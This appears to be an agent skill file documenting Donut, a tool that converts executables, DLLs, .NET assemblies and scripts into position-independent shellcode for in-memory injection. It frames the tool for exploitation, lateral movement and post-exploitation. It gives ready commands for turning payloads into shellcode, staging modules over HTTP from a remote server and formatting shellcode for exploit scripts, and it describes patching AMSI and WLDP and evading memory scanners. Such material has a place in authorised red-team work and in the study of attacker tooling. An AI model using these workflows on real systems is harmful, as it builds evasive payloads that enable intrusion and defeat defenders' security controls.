---
name: donut-shellcode
description: Generate position-independent shellcode (PIC) from VBScript, JScript, EXE, DLL files, and .NET assemblies for in-memory execution. Use when performing exploitation, lateral movement, or post-exploitation to bypass security controls like AMSI, WLDP, and ETW, or when staging payloads via HTTP.
---

# donut-shellcode

## Overview
Donut is a shellcode generation tool that creates position-independent code (PIC) payloads from standard Windows executables and scripts. It enables in-memory execution, effectively turning non-PIC files into payloads that can be injected into arbitrary processes. It features built-in encryption (Chaskey), compression, and bypasses for modern Windows security features. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume donut is already installed. If the command is missing:

```bash
sudo apt install donut
```

## Common Workflows

### Basic DLL to Shellcode
Convert a DLL into a 64-bit shellcode binary:
```bash
donut -i payload.dll -a 2 -o loader.bin
```

### .NET Assembly with Arguments
Convert a .NET DLL, specifying the class and method to invoke with parameters:
```bash
donut -i plugin.dll -c Namespace.Class -m RunMethod -p "arg1 arg2"
```

### HTTP Staged Payload
Generate a loader that downloads the actual module from a remote server to minimize the initial shellcode size:
```bash
donut -i heavy_payload.exe -s http://192.168.1.5/modules/ -n remote_mod
```

### Python-Formatted Output
Generate shellcode formatted as a Python byte array for use in exploit scripts:
```bash
donut -i exploit.exe -f 5 -o payload.py
```

## Complete Command Reference

```
usage: donut [options] <EXE/DLL/VBS/JS>
```

### Module Options

| Flag | Description |
|------|-------------|
| `-n, --modname <name>` | Module name for HTTP staging. Generated randomly if entropy is enabled. |
| `-s, --server <server>` | Server URL hosting the Donut module (e.g., `https://user:pass@192.168.0.1/`). |
| `-e, --entropy <level>` | Entropy level: `1`=None, `2`=Random names, `3`=Random names + symmetric encryption (default). |

### PIC/Shellcode Options

| Flag | Description |
|------|-------------|
| `-a, --arch, --cpu <arch>` | Target architecture: `1`=x86, `2`=amd64, `3`=x86+amd64 (default). |
| `-o, --output <path>` | Output file path. Default is `loader.bin`. |
| `-f, --format <format>` | Output format: `1`=Binary (default), `2`=Base64, `3`=C, `4`=Ruby, `5`=Python, `6`=Powershell, `7`=C#, `8`=Hex. |
| `-y, --fork <offset>` | Create a new thread for the loader; continue execution at `<offset>` relative to host process executable. |
| `-x, --exit <action>` | Exit behavior: `1`=Exit thread (default), `2`=Exit process, `3`=Do not exit/block indefinitely. |

### File Options

| Flag | Description |
|------|-------------|
| `-c, --class <ns.class>` | Optional class name (Required for .NET DLL). |
| `-d, --domain <name>` | AppDomain name for .NET assembly. Generated randomly if entropy is enabled. |
| `-i, --input, --file <path>` | Input file to execute in-memory. |
| `-m, --method, --function <api>` | Optional method (.NET) or function (DLL) name. |
| `-p, --args <arguments>` | Parameters/command line arguments inside quotations. |
| `-w, --unicode` | Pass command line to unmanaged DLL function in UNICODE (default is ANSI). |
| `-r, --runtime <version>` | CLR runtime version (e.g., `v4.0.30319`). Uses MetaHeader by default. |
| `-t, --thread` | Execute the entrypoint of an unmanaged EXE as a thread. |

### Extra Options

| Flag | Description |
|------|-------------|
| `-z, --compress <engine>` | Pack/Compress file. `1`=None. |
| `-b, --bypass <level>` | Bypass AMSI/WLDP/ETW: `1`=None, `2`=Abort on fail, `3`=Continue on fail (default). |
| `-k, --headers <level>` | Preserve PE headers: `1`=Overwrite (default), `2`=Keep all. |
| `-j, --decoy <level>` | Optional path of decoy module for Module Overloading. |

## Notes
- **Security Bypasses**: By default, Donut attempts to patch AMSI and WLDP to facilitate in-memory execution of known malicious patterns.
- **.NET Requirements**: When using .NET DLLs, both the `--class` and `--method` flags are typically mandatory.
- **Memory Scanners**: Donut attempts to erase the original file reference in memory after loading to evade scanners.
- **Exit Behavior**: Use `-x 1` (Exit thread) when injecting into a long-running process to avoid killing the host process upon payload completion.